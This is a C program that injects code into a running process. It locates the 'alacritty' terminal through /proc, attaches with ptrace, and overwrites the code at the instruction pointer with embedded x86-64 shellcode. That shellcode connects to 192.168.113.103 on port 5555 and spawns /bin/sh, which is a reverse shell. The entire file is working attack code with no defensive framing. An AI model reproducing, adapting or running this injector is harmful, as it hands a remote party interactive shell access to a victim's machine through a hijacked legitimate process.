#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

unsigned char shellcode[] =
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    "\x48\xb9\x02\x00\x15\xb3\xc0\xa8\x71\x67\x51\x48\x89\xe6"
    "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
    "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
    "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
    "\x89\xe6\x0f\x05";

int get_pid_by_name(const char *process_name) {
  DIR *proc_dir = opendir("/proc");
  if (!proc_dir) {
    perror("opendir failed");
    return -1;
  }
  struct dirent *entry;
  while ((entry = readdir(proc_dir)) != NULL) {
    if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
      char cmdline_path[256];
      snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline",
               entry->d_name);
      FILE *cmdline_file = fopen(cmdline_path, "r");
      if (cmdline_file) {
        char cmdline[256];
        if (fgets(cmdline, sizeof(cmdline), cmdline_file) != NULL) {
          if (strstr(cmdline, process_name) != NULL) {
            fclose(cmdline_file);
            closedir(proc_dir);
            return atoi(entry->d_name);
          }
        }
        fclose(cmdline_file);
      }
    }
  }
  closedir(proc_dir);
  return -1;
}

// read memory from the target process
void read_mem(pid_t pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    if (errno) {
      perror("PTRACE_PEEKDATA failed");
      return;
    }
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    if (errno) {
      perror("PTRACE_PEEKDATA failed");
      return;
    }
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

// write memory into the target process
void write_mem(pid_t pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    if (ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val) ==
        -1) {
      perror("PTRACE_POKEDATA failed");
      return;
    }
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    // Need to read the original data first to avoid corrupting bytes we don't
    // want to change
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    if (errno) {
      perror("PTRACE_PEEKDATA failed during partial write");
      return;
    }
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    if (ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val) ==
        -1) {
      perror("PTRACE_POKEDATA failed during partial write");
      return;
    }
  }
}

int main() {
  const char *process_name = "alacritty";
  int status;
  int pid = get_pid_by_name(process_name);
  if (pid == -1) {
    printf("Could not find process: %s\n", process_name);
    return 1;
  }

  printf("Found PID %d for process %s\n", pid, process_name);

  // Use the correct payload length - don't subtract 1 for binary data
  int payload_len = sizeof(shellcode);
  char original_code[payload_len];
  struct user_regs_struct target_regs;

  // Attach to the process
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
    perror("Failed to attach to process");
    return 1;
  }
  printf("Successfully attached to process\n");

  // Wait for the process to stop
  if (waitpid(pid, &status, 0) == -1) {
    perror("waitpid failed");
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 1;
  }

  // Get register state
  if (ptrace(PTRACE_GETREGS, pid, NULL, &target_regs) == -1) {
    perror("Failed to get registers");
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 1;
  }

  printf("Process RIP: 0x%llx\n", (unsigned long long)target_regs.rip);

  // Save original code
  read_mem(pid, target_regs.rip, original_code, payload_len);
  printf("Saved original code\n");

  // Inject shellcode
  write_mem(pid, target_regs.rip, (char *)shellcode, payload_len);
  printf("Injected shellcode\n");

  // Let it run
  printf("Continuing execution - shellcode should execute now\n");

  if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
    perror("Failed to continue process");
    // Try to restore original code
    write_mem(pid, target_regs.rip, original_code, payload_len);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 1;
  }

  // Wait for the process to stop again (might be due to a signal or completion)
  printf("Waiting for process to stop...\n");
  if (waitpid(pid, &status, 0) == -1) {
    perror("waitpid failed after continuation");
  } else {
    if (WIFEXITED(status)) {
      printf("Process exited with status %d\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
      printf("Process terminated by signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
      printf("Process stopped by signal %d\n", WSTOPSIG(status));
    }
  }

  // Restore original code
  printf("Restoring original code\n");
  write_mem(pid, target_regs.rip, original_code, payload_len);

  // Detach from the process
  printf("Detaching from process\n");
  if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
    perror("Failed to detach from process");
    return 1;
  }

  printf("Operation completed\n");
  return 0;
}
